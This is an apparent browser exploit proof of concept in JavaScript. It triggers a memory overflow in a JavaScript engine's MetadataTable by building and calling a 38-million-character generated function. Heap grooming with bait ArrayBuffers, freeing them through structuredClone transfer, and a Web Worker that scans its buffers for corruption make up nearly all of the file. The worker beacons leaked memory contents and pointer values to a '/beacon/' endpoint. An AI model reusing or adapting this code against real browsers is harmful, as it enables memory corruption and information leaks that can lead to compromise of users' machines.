// p164 — MetadataTable overflow with concurrent Worker polling
// Main thread calls function → finishCreation sweep runs in C++ (not JS)
// Worker polls its own targets concurrently → detects corruption mid-sweep
// Worker sends sync XHR beacons before SIGSEGV kills the process
// V163 confirmed: CALLING then silence = process crash during finishCreation
// Beacon prefix: V164-
window.__p165_loaded = true;
(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V164-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  // ── WORKER CODE ──
  // Worker creates its own ArrayBuffer targets in shared heap
  // Polls at 112-byte stride for corruption during sweep
  var wSrc = [
    'var BQ=0;',
    'function WB(tag){try{var x=new XMLHttpRequest();x.open("POST","/beacon/V164-W-"+tag+"?t="+Date.now()+"&q="+(BQ++),false);x.send("");}catch(e){}}',
    'var targets=[];var views=[];var MARKER=0xAA;var BUF_SZ=100112;',
    'self.onmessage=function(e){',
    '  if(e.data.cmd==="alloc"){',
    '    var n=e.data.count;',
    '    for(var i=0;i<n;i++){',
    '      var ab=new ArrayBuffer(BUF_SZ);',
    '      var v=new Uint8Array(ab);',
    '      for(var j=0;j<BUF_SZ;j++)v[j]=MARKER;',
    '      targets.push(ab);views.push(v);',
    '    }',
    '    WB("TARGETS-"+targets.length);',
    '    self.postMessage({ready:true,count:targets.length});',
    '    return;',
    '  }',
    '  if(e.data.cmd==="poll"){',
    '    WB("POLLING");',
    '    var found=false;var iter=0;var stride=112;',
    '    while(!found){',
    '      for(var i=0;i<views.length&&!found;i++){',
    '        var v=views[i];',
    '        for(var off=12;off<BUF_SZ&&!found;off+=stride){',
    '          if(v[off]!==MARKER||v[off+1]!==MARKER||v[off+2]!==MARKER||v[off+3]!==MARKER){',
    '            found=true;',
    '            WB("HIT-V"+i+"-OFF"+off+"-"+v[off].toString(16)+v[off+1].toString(16)+v[off+2].toString(16)+v[off+3].toString(16));',
    '            var sample="";',
    '            var base=off-(off%stride);',
    '            for(var s=base;s<base+112&&s<BUF_SZ;s++){var h=v[s].toString(16);if(h.length<2)h="0"+h;sample+=h;}',
    '            WB("ENTRY-V"+i+"-BASE"+base+"-"+sample.substring(0,160));',
    '            if(sample.length>160)WB("ENTRY2-"+sample.substring(160));',
    '            var pOff=base+24;',
    '            if(pOff+8<=BUF_SZ){',
    '              var ptr="";for(var p=pOff+7;p>=pOff;p--){var h2=v[p].toString(16);if(h2.length<2)h2="0"+h2;ptr+=h2;}',
    '              WB("THUNK-"+ptr);',
    '            }',
    '            var bOff=base+68;',
    '            if(bOff+4<=BUF_SZ){',
    '              var idx=(v[bOff]|(v[bOff+1]<<8)|(v[bOff+2]<<16)|((v[bOff+3]<<24)>>>0))>>>0;',
    '              WB("BCIDX-"+idx);',
    '            }',
    '            var hitCount=0;',
    '            for(var vi=0;vi<views.length;vi++){',
    '              var vv=views[vi];var mod=false;',
    '              for(var co=12;co<BUF_SZ&&!mod;co+=stride){',
    '                if(vv[co]!==MARKER)mod=true;',
    '              }',
    '              if(mod)hitCount++;',
    '            }',
    '            WB("TOTAL-HITS-"+hitCount+"-OF-"+views.length);',
    '          }',
    '        }',
    '      }',
    '      iter++;',
    '      if(iter%100000===0)WB("ITER-"+iter);',
    '    }',
    '    WB("DONE");',
    '  }',
    '};'
  ].join('\n');

  var wBlob = new Blob([wSrc], {type: 'application/javascript'});
  var wUrl = URL.createObjectURL(wBlob);
  var worker = new Worker(wUrl);

  worker.onerror = function(e) { B('WERR-' + (e.message || '').substring(0, 40)); };

  // ── PHASE 1: BAITS — 100112-byte ArrayBuffers on main thread ──
  var BAIT_COUNT = 400;
  var BUF_SZ = 100112;
  var baits = new Array(BAIT_COUNT);
  for (var i = 0; i < BAIT_COUNT; i++) {
    baits[i] = new ArrayBuffer(BUF_SZ);
  }
  B('BAITS-' + BAIT_COUNT);

  // ── PHASE 2: TARGETS — Worker creates its own buffers at higher addresses ──
  var TARGET_COUNT = 300;
  worker.postMessage({cmd: 'alloc', count: TARGET_COUNT});

  worker.onmessage = function(e) {
    if (!e.data.ready) return;
    B('WORKER-READY-' + e.data.count);

    // ── PHASE 3: FREE BAITS via structuredClone transfer ──
    var freed = 0;
    for (var i = 0; i < BAIT_COUNT; i++) {
      try {
        structuredClone(baits[i], {transfer: [baits[i]]});
        freed++;
      } catch(ex) {}
      baits[i] = null;
    }
    baits = null;
    B('FREED-' + freed);

    // ── PHASE 4: GC via setTimeout ──
    setTimeout(function() {
      for (var g = 0; g < 30; g++) {
        var junk = [];
        for (var j = 0; j < 100000; j++) junk.push({x: j, y: j * 2});
        junk = null;
      }
      B('GC-DONE');

      // ── PHASE 5: BUILD 38M FUNCTION ──
      var src = 'window.__p164fn=function(a){';
      var chunk = 'a();a();a();a();a();a();a();a();a();a();';
      var big = '';
      for (var k = 0; k < 1000; k++) big += chunk;
      var parts = [src];
      for (var k = 0; k < 3834; k++) parts.push(big);
      var rem = 38348816 - 38340000;
      var remStr = '';
      for (var k = 0; k < rem; k++) remStr += 'a();';
      parts.push(remStr);
      parts.push('};window.__p164ok=1;');

      var blob = new Blob(parts, {type: 'application/javascript'});
      B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
      parts = null; big = null;

      var url = URL.createObjectURL(blob);
      var sc = document.createElement('script');
      sc.onerror = function() { B('SCRIPT-ERR'); };
      sc.onload = function() {
        B('LOADED-' + (window.__p164ok ? 'OK' : 'FAIL'));

        // ── PHASE 6: START WORKER POLLING ──
        worker.postMessage({cmd: 'poll'});

        // ── PHASE 7: CALL THE FUNCTION ──
        // finishCreation runs in C++ loop (not JS) — Worker polls concurrently
        // Sweep writes 4.3GB forward from MetadataTable
        // Eventually hits unmapped pages → SIGSEGV kills process
        // But Worker already sent beacons with corruption data
        setTimeout(function() {
          B('CALLING');
          try {
            window.__p164fn(function(){});
          } catch(ex) {
            B('CAUGHT-' + String(ex).substring(0, 30));
          }
          B('SURVIVED');
        }, 200);
      };
      sc.src = url;
      document.head.appendChild(sc);
    }, 500);
  };
})();
